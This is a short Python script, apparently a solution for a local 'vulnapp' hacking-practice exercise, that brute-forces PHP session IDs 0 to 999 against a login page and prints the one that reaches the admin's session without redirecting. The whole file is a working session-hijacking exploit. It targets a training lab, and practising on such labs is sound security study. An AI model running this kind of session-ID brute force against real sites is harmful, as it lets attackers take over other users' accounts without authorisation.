import requests

for i in range(0,1000):
    r = requests.get("http://127.0.0.1/vulnapp/client/hackingpractices/practices/sess_hijack/login.php", allow_redirects=True, cookies={"PHPSESSID": f"{i}", "path": "/"})
    if not "login.php" in r.url:
        print(f"{i} is the admin's session ID")